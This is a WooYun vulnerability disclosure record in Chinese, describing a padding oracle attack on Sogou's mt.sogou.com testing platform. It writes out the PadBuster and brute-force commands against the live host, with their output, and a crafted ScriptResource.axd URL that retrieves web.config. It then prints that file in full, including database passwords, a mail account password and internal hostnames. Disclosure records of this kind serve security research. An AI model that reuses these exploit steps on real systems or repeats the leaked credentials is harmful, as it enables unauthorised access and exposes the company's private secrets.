{"id": 84902, "wybug_id": "wooyun-2016-0169967", "wybug_title": "搜狗云测平台敏感信息泄露（padding oracle漏洞实战）", "wybug_corp": "搜狗", "wybug_author": "冰无漪", "wybug_date": "2016-01-16 10:48", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["搜狗", "信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 老漏洞了快过年了该加强下线上主机安全扫描工作了要不然大家都来给你们拜年了别忘了给红包 详细说明：  一切罪恶的根源在从页面中的这个链接开始：http://mt.sogou.com/WebResource.axd?d=1450089073该漏洞出现很久了利用脚本已公开，安装好perl环境，读取web.config执行：perl padbuster.pl http://mt.sogou.com/WebResource.axd?d=9MBwmxN6TLKjC8S3CdFGyw2 9MBwmxN6TLKjC8S3CdFGyw2 16 -encoding 3 -plaintext \"|||~/web.config\"几分钟后返回如下信息，输入2进行选择INFO: The original request returned the following[+] Status: 500[+] Location: N/A[+] Content Length: 4733INFO: Starting PadBuster Encrypt Mode[+] Number of Blocks: 1INFO: No error string was provided...starting response analysis*** Response Analysis Complete ***The following response signatures were returned:-------------------------------------------------------ID#\tFreq\tStatus\tLength\tLocation-------------------------------------------------------1\t1\t404\t2093\tN/A2 **\t255\t500\t4733\tN/A-------------------------------------------------------Enter an ID that matches the error conditionNOTE: The ID# marked with ** is recommended : 2Continuing test with selection 2[+] Success: (124/256) [Byte 16][+] Success: (59/256) [Byte 15][+] Success: (7/256) [Byte 14][+] Success: (26/256) [Byte 13][+] Success: (242/256) [Byte 12][+] Success: (176/256) [Byte 11][+] Success: (181/256) [Byte 10][+] Success: (145/256) [Byte 9][+] Success: (204/256) [Byte 8][+] Success: (93/256) [Byte 7][+] Success: (32/256) [Byte 6][+] Success: (1/256) [Byte 5][+] Success: (88/256) [Byte 4][+] Success: (229/256) [Byte 3][+] Success: (169/256) [Byte 2][+] Success: (79/256) [Byte 1]Block 1 Results:[+] New Cipher Text (HEX): dd2469dbdc9ccc5f492f39658493a084[+] Intermediate Bytes (HEX): a15815a5f3eba93d674c560be2fac785-------------------------------------------------------** Finished ***[+] Encrypted value is: 3SRp29yczF9JLzllhJOghAAAAAAAAAAAAAAAAAAAAAA1-------------------------------------------------------到这里，就拿到了web.config的URL的加密地址。下面就该上Webconfig Bruter.pl继续填充并获取完整的访问地址了。perl Webconfig Bruter.pl http://mt.sogou.com/ScriptResource.axd 3SRp29yczF9JLzllhJOghAAAAAAAAAAAAAAAAAAAAAA1 16等了半个多小时终于有了结果，返回了web.config的内部信息：<?xml version=\"1.0\" encoding=\"UTF-8\"?><!--  有关如何配置 ASP.NET 应用程序的详细信息，请访问  http://go.microsoft.com/fwlink/?LinkId=169433  --><configuration>\t<appSettings>\t\t<!-- 内网线上环境配置 -->        <!--<add key=\"UserPermitQueryUrl\" value=\"http://venus.sogou-inc.com\" />\t\t<add key=\"mysqlConnectionString\" value=\"server=database.desktopqa.com;user id=venus_all; password=vnfjru@Venus_2013; database=cloud; pooling=false;charset=utf8;Allow Zero Datetime=True\" />\t\t<add key=\"fileServerString\" value=\"http://f.venus.sogou-inc.com\" />\t\t<add key=\"redisConnectionString\" value=\"master.redis.desktopqa.com:6379\" />\t\t<add key=\"loginString\" value=\"http://m.venus.sogou-inc.com/public/sso/#/?type=p3p*returnUrl=\" />\t\t<add key=\"logoutString\" value=\"http://m.venus.sogou-inc.com/public/sso/#/?action=logout*type=p3p*returnUrl=\" />\t\t<add key=\"host\" value=\"http://m.venus.sogou-inc.com\" />\t\t<add key=\"max\" value=\"100\" />-->\t\t<!-- 内网测试环境配置 -->\t\t<!--<add key=\"UserPermitQueryUrl\" value=\"http://10.134.64.222:3000\"/>-->\t\t<!--<add key=\"UserPermitQueryUrl\" value=\"http://pre.effevo.com\"/>            <add key=\"mysqlConnectionString\" value=\"server= test.mysql.desktopqa.com;user id=venus_all; password=vnfjru@Venus_2013; database=cloud; pooling=false;charset=utf8;Allow Zero Datetime=True\"/>            <add key=\"fileServerString\" value=\"http://f.venus.sogou-inc.com\"/>            <add key=\"redisConnectionString\" value=\"test.redis.desktopqa.com:6379\"/>            <add key=\"loginString\" value=\"http://pre.effevo.com/public/sso/#/?type=jsonp*returnUrl=\" />            <add key=\"logoutString\" value=\"http://pre.effevo.com/public/sso/#/?action=logout*type=jsonp*returnUrl=\" />            <add key=\"host\" value=\"http://doc.desktopqa.com\"/>             <add key=\"max\" value=\"10000\"/>-->\t\t<!-- 外网线上环境配置 -->        <add key=\"UserPermitQueryUrl\" value=\"http://anonymous.effevo.com\"/>\t\t<add key=\"mysqlConnectionString\" value=\"server=master.mysql.desktopqa.com;user id=venus_all; password=vnfjru@Venus_2013; database=cloud_public; pooling=false;charset=utf8;Allow Zero Datetime=True\"/>\t\t<add key=\"fileServerString\" value=\"http://file.mt.sogou.com\"/>\t\t<add key=\"redisConnectionString\" value=\"master.redis.effevo.com:6379\"/>\t\t<add key=\"loginString\" value=\"http://mt.sogou.com/public/sso/#/?type=p3p*returnUrl=\"/>\t\t<add key=\"logoutString\" value=\"http://mt.sogou.com/public/sso/#/?action=logout*type=p3p*returnUrl=\"/>\t\t<add key=\"host\" value=\"http://mt.sogou.com\"/>\t\t<add key=\"max\" value=\"100\"/>\t\t<!--调试跨域登录使用-->\t\t<!--<add key=\"loginString\" value=\"http://mt.sogou.com/public/sso/#/?type=jsonp*returnUrl=\"/>-->\t\t<!--非匿名邮件服务器用户名密码-->\t\t<add key=\"AuthenticationMailUsername\" value=\"venus@sogou-inc.com\" />\t\t<add key=\"AuthenticationMailPassword\" value=\"vns-2014\" />\t</appSettings>\t<connectionStrings>\t\t<add name=\"ApplicationServices\" connectionString=\"data source=.\\SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\\aspnetdb.mdf;User Instance=true\" providerName=\"System.Data.SqlClient\" />\t</connectionStrings>\t<system.web>\t\t<compilation debug=\"false\" targetFramework=\"4.0\" />\t\t<httpRuntime maxRequestLength=\"2100000000\" maxQueryStringLength=\"10240\" executionTimeout=\"3600\" />\t\t<authentication mode=\"Forms\">\t\t\t<forms name=\".ASPXAUTH\" protection=\"All\" timeout=\"60\" />\t\t</authentication>\t\t<membership>\t\t\t<providers>\t\t\t\t<clear />\t\t\t\t<add name=\"AspNetSqlMembershipProvider\" type=\"System.Web.Security.SqlMembershipProvider\" connectionStringName=\"ApplicationServices\" enablePasswordRetrieval=\"false\" enablePasswordReset=\"true\" requiresQuestionAndAnswer=\"false\" requiresUniqueEmail=\"false\" maxInvalidPasswordAttempts=\"5\" minRequiredPasswordLength=\"6\" minRequiredNonalphanumericCharacters=\"0\" passwordAttemptWindow=\"10\" applicationName=\"/\" />\t\t\t</providers>\t\t</membership>\t\t<profile>\t\t\t<providers>\t\t\t\t<clear />\t\t\t\t<add name=\"AspNetSqlProfileProvider\" type=\"System.Web.Profile.SqlProfileProvider\" connectionStringName=\"ApplicationServices\" applicationName=\"/\" />\t\t\t</providers>\t\t</profile>\t\t<roleManager enabled=\"false\">\t\t\t<providers>\t\t\t\t<clear />\t\t\t\t<add name=\"AspNetSqlRoleProvider\" type=\"System.Web.Security.SqlRoleProvider\" connectionStringName=\"ApplicationServices\" applicationName=\"/\" />\t\t\t\t<add name=\"AspNetWindowsTokenRoleProvider\" type=\"System.Web.Security.WindowsTokenRoleProvider\" applicationName=\"/\" />\t\t\t</providers>\t\t</roleManager>\t\t<httpModules>\t\t\t<!--<add name=\"PreCheck\" type=\"PreCheckModule\" />-->\t\t</httpModules>\t</system.web>\t<system.webServer>\t\t<modules runAllManagedModulesForAllRequests=\"true\" />\t\t<security>\t\t\t<requestFiltering>\t\t\t\t<requestLimits maxAllowedContentLength=\"2147483647\"></requestLimits>\t\t\t</requestFiltering>\t\t</security>\t\t<staticContent>\t\t\t<remove fileExtension=\".woff\" />\t\t\t<mimeMap fileExtension=\".woff\" mimeType=\"application/font-woff\" />\t\t</staticContent>\t\t<defaultDocument enabled=\"true\">\t\t\t<files>\t\t\t\t<clear />\t\t\t\t<add value=\"Default.html\" />\t\t\t\t<add value=\"Default.aspx\" />\t\t\t</files>\t\t</defaultDocument>\t\t<httpErrors errorMode=\"Custom\">\t\t\t<remove statusCode=\"404\" subStatusCode=\"-1\" />\t\t\t<error statusCode=\"404\" prefixLanguageFilePath=\"\" path=\"/Pages/404.html\" responseMode=\"ExecuteURL\" />\t\t</httpErrors>\t</system.webServer>\t<system.web>\t\t<customErrors mode=\"Off\" />\t</system.web>    <location path=\"Pages/index.html\">        <system.webServer>            <staticContent>                <clientCache cacheControlMode=\"DisableCache\" />            </staticContent>        </system.webServer>    </location>    <location path=\"Default.html\">        <system.webServer>            <staticContent>                <clientCache cacheControlMode=\"DisableCache\" />            </staticContent>        </system.webServer>    </location></configuration>Total Requests:31144Resulting Exploit Block:eFbahIR-kVx2i1D4Yym7A90kadvcnMxfSS85ZYSToIQAAAAAAAAAAAAAAAAAAAAA0页面访问的话，根据结尾的加密字符串构造url：http://mt.sogou.com/ScriptResource.axd?d=eFbahIR-kVx2i1D4Yym7A90kadvcnMxfSS85ZYSToIQAAAAAAAAAAAAAAAAAAAAA0配置文件中数据库密码信息泄露   漏洞证明：  \n\n\n\n\n\n   修复方案：  官方已经发布了补丁！提前拜个年给个红包！   版权声明：转载请注明来源 冰无漪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-18 17:59 厂商回复： 感谢支持，到SGSRC报漏洞可领红包 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-16 16:09 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:445 漏洞数:104        | 我是突突兔！)\t\t \n  padding oracle 这个漏洞不是很好利用，而且普遍存在(大部分)。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}